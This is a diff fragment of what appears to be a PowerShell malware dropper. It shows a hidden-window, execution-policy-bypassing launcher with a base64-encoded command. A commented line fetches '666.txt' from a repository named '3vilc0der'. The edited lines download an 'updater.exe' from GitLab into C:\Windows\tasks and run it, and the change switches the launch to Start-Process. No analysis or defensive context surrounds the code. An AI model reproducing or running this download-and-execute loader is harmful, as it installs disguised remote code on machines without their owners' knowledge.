@@ -2,7 +2,7 @@ powershell -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -enc "UwBlAHQA
 
 //iwr -uri https://raw.githubusercontent.com/3vilc0der/afwefd237/main/666.txt -O "C:\Windows\tasks\666.txt";.\666.txt
 
-iwr -uri https://gitlab.com/sfdva/updater/-/raw/main/updater.exe -O "C:\Windows\tasks\updater.exe";.\updater.exe
-
+iwr -uri https://gitlab.com/sfdva/updater/-/raw/main/updater.exe -O "C:\Windows\tasks\updater.exe";
+Start-Process -FilePath "C:\Windows\tasks\updater.exe"
 
 
